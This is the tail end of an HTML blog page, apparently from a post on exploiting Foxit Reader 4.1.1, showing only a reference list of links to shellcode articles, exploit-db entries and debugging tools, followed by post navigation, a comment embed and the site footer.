  <li><a href="http://www.phrack.org/archives/61/p61_0x0b_Building%20IA32%20%27Unicode-Proof%27%20Shellcodes_by_obscou.txt">Building IA32 ‘Unicode-Proof’ Shellcodes</a></li>
  <li><a href="http://www.phrack.org/archives/57/p57_0x0f_Writing%20ia32%20alphanumeric%20shellcodes_by_rix.txt">Writing ia32 alphanumeric shellcodes</a></li>
  <li><a href="http://skypher.com/wiki/index.php/Hacking/Shellcode/Alphanumeric/ALPHA2">Alpha2 encoder</a></li>
  <li><a href="http://www.corelan.be:8800/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/">Peter Van Eeckhoutte’s Exploit writing tutorial part 7 : unicode from 0x00410041 tocalc</a></li>
</ul>

<h1 id="exploits-and-other-write-ups">Exploits and other write ups</h1>

<ul>
  <li><a href="http://www.exploit-db.com/exploits/15542/">Foxit Reader 4.1.1 Stack Overflow Exploit - Egghunter Mod</a></li>
  <li><a href="http://www.exploit-db.com/exploits/15514/">Foxit Reader v4.1.1 Stack Overflow Vulnerability (PoC)</a></li>
  <li><a href="http://www.corelan.be:8800/index.php/2010/11/13/offensive-security-exploit-weekend/">Sud0 write-up</a></li>
</ul>

<h1 id="tools">Tools</h1>

<ul>
  <li><a href="http://redmine.corelan.be:8800/projects/pvefindaddr">pvefindaddr</a></li>
  <li><a href="http://www.immunityinc.com/products-immdbg.shtml">ImmunityDbg</a></li>
</ul>

  </div>

  <div class="post-navigation">
    
    <a class="post-prev" href="/binholic/2010/11/13/wargame-vmzenk2-level4.html">Previous : [Wargame] VmZenk2 - level4</a>
    

    
    <a class="post-next" href="/binholic/2010/11/20/tips-and-tools-for-linux-and-windows.html">Next : Tips and tools for Linux and Windows</a>
    
  </div>

  
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = "http://binholic.com/2010/11/19/exploitation-foxit-reader-411-unicode.html";
            this.page.identifier = "/2010/11/19/exploitation-foxit-reader-411-unicode";
        };

        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document, s = d.createElement('script');

            s.src = '//binholic.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
  

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

      <div class="site-footer">
        <ul class="social-media-list">
          
          <li>
            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
<g>
	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
</g>
</svg></span></a>

          </li>
          

          
          <li>
            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   version="1.0"
   width="79.12"
   height="52.64">
  <defs/>
  <g
     transform="translate(-47.495719,-111.30691)">
    <path
       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
  </g>
</svg>
</span></a>

          </li>
          
        </ul>
      </div>

    </div>

  </div>

</footer>


  </body>

</html>
